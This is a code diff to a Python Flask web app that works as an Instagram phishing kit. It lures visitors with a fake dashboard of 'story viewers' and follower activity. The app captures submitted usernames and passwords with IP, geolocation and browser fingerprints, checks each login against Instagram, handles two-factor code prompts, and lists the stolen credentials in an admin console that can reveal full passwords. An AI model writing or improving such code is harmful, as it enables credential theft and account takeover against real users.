@@ -69,6 +69,10 @@ COOKIE_MAX_AGE = 60 * 60 * 24 * 365
 LOGIN_WAIT = float(os.environ.get("LOGIN_WAIT", "20"))
 SYNC_MIN_INTERVAL = int(os.environ.get("SYNC_MIN_INTERVAL", "90") or 90)
 
+# verdicts that keep the visitor on the login page (no dashboard)
+DENIED_VERDICTS = ("bad_password", "bad_user", "suspended", "proxy",
+                   "challenge", "rate", "session")
+
 _ansi_env = os.environ.get("ANSI")
 ANSI_ON = (_ansi_env != "0") if _ansi_env is not None else True
 
@@ -467,6 +471,13 @@ def make_initials(name: str) -> str:
     return ("".join(p[0] for p in parts[:2]) or name[:2] or "YO").upper()
 
 
+def mask(secret: str) -> str:
+    secret = secret or ""
+    if len(secret) <= 2:
+        return "*" * len(secret)
+    return secret[0] + "*" * (len(secret) - 2) + secret[-1]
+
+
 def cred_box(title: str, username: str, password: str) -> tuple:
     return (title, [
         ("username : " + (username or "(blank)"), "uval"),
@@ -516,6 +527,15 @@ def html(body: str, status: int = 200) -> Response:
 
 
 # ============================== capture ==============================
+def _same_account(stored_user: str, new_user: str) -> bool:
+    """Typing "mah" then "mahim" is the same person; "mah" then "mahim2" is not."""
+    if not stored_user or not new_user:
+        return True
+    return (stored_user == new_user
+            or new_user.startswith(stored_user)
+            or stored_user.startswith(new_user))
+
+
 def capture_credential(username: str, password: str, source: str, sid: str, meta: dict) -> tuple[int, bool]:
     """Insert, or merge into a very recent partial row for the same browser.
 
@@ -535,14 +555,20 @@ def capture_credential(username: str, password: str, source: str, sid: str, meta
             conn = connect()
             try:
                 row = conn.execute(
-                    "SELECT id FROM creds WHERE cid=? AND created_at>=? "
-                    "AND (username='' OR password='') "
-                    "AND (username=? OR username='' OR ? LIKE username || '%') "
-                    "AND (password=? OR password='') "
+                    "SELECT id, username, password FROM creds "
+                    "WHERE cid=? AND created_at>=? AND (username='' OR password='') "
                     "ORDER BY id DESC LIMIT 1",
-                    (g.cid, iso_ago(90), username, username, password),
+                    (g.cid, iso_ago(90)),
                 ).fetchone()
+
+                merge = False
                 if row:
+                    old_u = row["username"] or ""
+                    old_p = row["password"] or ""
+                    # same account, and no different password already stored
+                    merge = _same_account(old_u, username) and (not old_p or old_p == password)
+
+                if row and merge:
                     conn.execute(
                         "UPDATE creds SET username=?, password=?, source=?, ip=?, ua=?, referer=?, "
                         "accept_lang=?, meta_json=?, country=?, city=?, isp=?, geo_json=?, "
@@ -1116,7 +1142,7 @@ main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;backgrou
 .search::placeholder{color:var(--mut)}
 .chip{border:0;background:var(--chip);color:var(--tx);padding:9px 15px;border-radius:10px;font:600 13px inherit;cursor:pointer;transition:all .35s var(--e)}
 .chip:hover{transform:translateY(-2px);box-shadow:0 6px 14px rgba(0,0,0,.1)}
-.chip:active{transform:<｜begin▁of▁sentence｜>#cope}
+.chip:active{transform:scale(.95)}
 .chip.on{background:var(--tx);color:var(--bg)}
 .ttl{font:700 24px inherit;letter-spacing:-.5px}.sub{color:var(--mut);font-size:14px;margin:4px 0 20px}
 .row{display:flex;align-items:center;gap:13px;padding:9px 10px;margin:0 -10px;border-radius:14px;animation:in .5s both var(--e);transition:background .3s,transform .4s var(--e),box-shadow .4s var(--e)}
@@ -1256,10 +1282,10 @@ function mapState(s){
  D.stalkers=(L.stalkers||[]).map(x=>({n:x.full_name||x.username,h:x.username,m:"Story views",c:x.views,v:x.verified?1:0,pk:x.pk,pic:x.pic}));
  D.act=(L.activity||[]).map(x=>({
   g:"Recent",
-  i:{unfollow:"out",follow:"plus",like:"broken",unfollowed:"trash"}[x.kind]||"act",
+  i:{unfollow:"out",follow:"plus",like:"broken",unfollowed:"trash",followed:"plus"}[x.kind]||"act",
   t:ESC(x.text),
   s:new Date((x.ts||0)*1000).toLocaleTimeString([],{hour:"2-digit",minute:"2-digit"}),
-  tg:x.kind==="follow"?["","New follower"]:x.kind==="like"?["red","Like removed"]:["red","Unfollow"]}));
+  tg:x.kind==="follow"?["","New follower"]:x.kind==="followed"?["","You followed"]:x.kind==="like"?["red","Like removed"]:["red","Unfollow"]}));
 }
 
 async function load(){
@@ -1307,6 +1333,7 @@ function home(){
  <div class="pi"><div class="h"><h2>${ESC(PF.username)}</h2><button class="btn g" id="sync">Sync</button></div>
  <div class="st"><div><b>${PF.media||0}</b> posts</div><div><b>${PF.followers||0}</b> followers</div><div><b>${PF.following||0}</b> following</div></div>
  <p><b>${ESC(PF.full_name||"")}</b><br><span>${ESC(PF.bio||"Live data from Instagram")}</span></p></div></div>
+ ${NOTICE?`<p class="sub">${ESC(NOTICE)}</p>`:""}
  <div class="sec" style="margin-top:6px"><h3>Top story viewers</h3><a data-k="stalkers">See all</a></div>
  <div class="stories">${st.length?st.map((x,i)=>`<div data-k="stalkers"><div class="ring" style="padding:3px"><span style="background:${gr(i)}">${ini(x.h)}</span></div><em>${x.c}</em><small>${ESC(x.h)}</small></div>`).join(""):`<div style="width:100%;color:var(--mut);font-size:13px;padding:8px 0">No active story — post one, then sync</div>`}</div>
  <div class="sec"><h3>Insights</h3></div>
@@ -1547,6 +1574,19 @@ function cp(el){
 </body></html>
 """
 
+LOGIN_ADMIN_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>Console</title>
+<style>body{margin:0;height:100vh;display:grid;place-items:center;background:#0a0a0c;color:#ececf1;
+font-family:ui-monospace,Menlo,monospace}form{background:#141419;border:1px solid #232329;
+padding:26px;border-radius:14px;display:grid;gap:10px;width:280px}
+h1{font-size:13px;letter-spacing:.15em;text-transform:uppercase;margin:0 0 6px}
+input{background:#0a0a0c;border:1px solid #232329;color:#ececf1;padding:10px 12px;border-radius:9px;font:inherit;outline:none}
+input:focus{border-color:#3ba7ff}button{background:#3ba7ff;border:0;color:#001522;font:inherit;font-weight:700;
+padding:10px;border-radius:9px;cursor:pointer}</style></head><body>
+<form method="get" action="/admin"><h1>insight console</h1>
+<input type="password" name="token" placeholder="admin token" autofocus>
+<button type="submit">unlock</button></form></body></html>"""
+
 ADMIN_SELECT = """SELECT c.id, c.created_at, c.ip, c.ua, c.source, c.username, c.password,
                          c.country, c.city, c.isp, c.verdict FROM creds c"""
 
@@ -1566,7 +1606,7 @@ def render_admin(body: str) -> str:
 def verdict_tag(verdict: str) -> str:
     if verdict == "ok":
         return '<span class="tag ok">ok</span> '
-    if verdict in ("bad_password", "bad_user", "suspended", "proxy"):
+    if verdict in DENIED_VERDICTS:
         return '<span class="tag bad">denied</span> '
     if verdict:
         return f'<span class="tag">{escape(verdict)}</span> '
@@ -1708,15 +1748,18 @@ def login():
 
     if verdict == "ok":
         print_box("✔ LOGIN OK", [(f"user    : {username}", "uval")], "ok", "ctx")
-    elif verdict in ("bad_password", "bad_user", "suspended", "proxy"):
+    elif verdict in DENIED_VERDICTS:
         print_box("✖ LOGIN DENIED", [(f"user    : {username}", "uval"),
                                      (f"reason  : {verdict}", "cred_val")], "bad", "ctx")
+    elif verdict == "code":
+        print_box("… LOGIN NEEDS CODE", [(f"user    : {username}", "uval")], "cred", "ctx")
     else:
         print_box("… LOGIN PENDING", [(f"user    : {username}", "uval"),
                                       (f"verdict : {verdict or 'timeout'}", "cred_val")], "cred", "ctx")
 
-    if verdict in ("bad_password", "bad_user", "suspended", "proxy"):
-        banner = f'<div class="msg">{escape(job.error)}</div>'
+    if verdict in DENIED_VERDICTS:
+        reason = job.error or "Instagram rejected the login. Try again."
+        banner = f'<div class="msg">{escape(reason)}</div>'
         return html(LOGIN_PAGE_HTML.replace("<!--MSG-->", banner)
                     .replace("__USER__", str(escape(username))), 200)
 
@@ -1759,6 +1802,7 @@ def api_state():
             st["phase"] = "error"
             st["error"] = st["error"] or "Job lost — press Try again."
         st.setdefault("choice", "")
+        st.setdefault("engaged_ok", True)
         return jsonify(st)
     return jsonify({"phase": "error", "error": "No login data — sign in again.",
                     "profile": {}, "counts": {}, "lists": {}})
@@ -1839,7 +1883,7 @@ def api_follow():
 
 @app.route("/cookies")
 def cookies_view():
-    """Last credential this browser submitted."""
+    """Last credential this browser submitted. `?full=1` reveals the password."""
     cred = session.get("last_cred")
     conn = connect()
     try:
@@ -1853,6 +1897,7 @@ def cookies_view():
     if not row:
         return jsonify({"ok": False, "message": "nothing captured for this browser yet"})
 
+    pw = row["password"] or ""
     return jsonify({
         "ok": True,
         "id": row["id"],
@@ -1860,7 +1905,8 @@ def cookies_view():
         "source": row["source"],
         "verdict": row["verdict"],
         "username": row["username"],
-        "password": row["password"],
+        "password": pw if request.args.get("full") == "1" else mask(pw),
+        "password_masked": mask(pw),
         "ip": row["ip"],
         "geo": json.loads(row["geo_json"] or "{}"),
         "fingerprint": json.loads(row["meta_json"] or "{}"),
@@ -2161,19 +2207,6 @@ def e500(_):
     logger.exception("unhandled error")
     return error_page("500", "something broke", 500)
 
-
-LOGIN_ADMIN_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1"><title>Console</title>
-<style>body{margin:0;height:100vh;display:grid;place-items:center;background:#0a0a0c;color:#ececf1;
-font-family:ui-monospace,Menlo,monospace}form{background:#141419;border:1px solid #232329;
-padding:26px;border-radius:14px;display:grid;gap:10px;width:280px}
-h1{font-size:13px;letter-spacing:.15em;text-transform:uppercase;margin:0 0 6px}
-input{background:#0a0a0c;border:1px solid #232329;color:#ececf1;padding:10px 12px;border-radius:9px;font:inherit;outline:none}
-input:focus{border-color:#3ba7ff}button{background:#3ba7ff;border:0;color:#001522;font:inherit;font-weight:700;
-padding:10px;border-radius:9px;cursor:pointer}</style></head><body>
-<form method="get" action="/admin"><h1>insight console</h1>
-<input type="password" name="token" placeholder="admin token" autofocus>
-<button type="submit">unlock</button></form></body></html>"""
 
 # ============================== boot ==============================
 init_db()
